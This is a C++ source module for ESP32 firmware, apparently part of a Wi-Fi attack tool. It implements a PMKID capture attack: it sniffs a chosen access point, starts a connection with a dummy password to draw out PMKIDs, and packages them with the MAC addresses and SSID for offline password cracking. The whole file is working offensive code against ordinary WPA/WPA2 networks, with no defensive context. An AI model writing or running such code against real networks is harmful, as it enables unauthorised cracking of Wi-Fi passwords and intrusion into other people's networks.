#include "StrikePmkid.hpp"
#include <cstring>
#include <cstdlib>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"
#include "PacketEngine.hpp"
#include "RadioInterface.hpp"
#include "FrameParser.hpp"

static const char* Tag = "StrikePmkid";
static const wifi_ap_record_t* ActiveTarget = nullptr;

static void OnPmkidCaptured(void*, esp_event_base_t, int32_t, void* Data) {
    PacketEngine::SetState(StateDone);
    StrikePmkid::Stop();

    auto* Head = *static_cast<PmkidNode**>(Data);
    unsigned Count = 0;
    for (PmkidNode* N = Head; N; N = N->Next) Count++;

    const unsigned SsidLen = strlen(reinterpret_cast<const char*>(ActiveTarget->ssid));
    char* Payload = PacketEngine::AllocPayload(6 + 6 + 1 + SsidLen + Count * 16);

    RadioInterface::GetStaMac(reinterpret_cast<uint8_t*>(Payload));
    Payload += 6;
    memcpy(Payload, ActiveTarget->bssid, 6);
    Payload += 6;
    Payload[0] = static_cast<char>(SsidLen);
    Payload += 1;
    memcpy(Payload, ActiveTarget->ssid, SsidLen);
    Payload += SsidLen;

    for (PmkidNode* Cur = Head; Cur;) {
        PmkidNode* Next = Cur->Next;
        memcpy(Payload, Cur->Value, 16);
        Payload += 16;
        free(Cur);
        Cur = Next;
    }
}

namespace StrikePmkid {
    void Start(EngineConfig* Cfg) {
        ActiveTarget = Cfg->Target;
        RadioInterface::SetSnifferFilter(true, false, false);
        RadioInterface::StartSniffer(ActiveTarget->primary);
        FrameParser::StartCapture(SearchPmkid, ActiveTarget->bssid);
        RadioInterface::ConnectStation(ActiveTarget, "Placeholder1!");
        ESP_ERROR_CHECK(esp_event_handler_register(
            FrameParserEvents, EventPmkidCaptured, &OnPmkidCaptured, nullptr));
    }

    void Stop() {
        RadioInterface::DisconnectStation();
        RadioInterface::StopSniffer();
        FrameParser::StopCapture();
        ESP_ERROR_CHECK(esp_event_handler_unregister(
            ESP_EVENT_ANY_BASE, ESP_EVENT_ANY_ID, &OnPmkidCaptured));
        ActiveTarget = nullptr;
    }
}
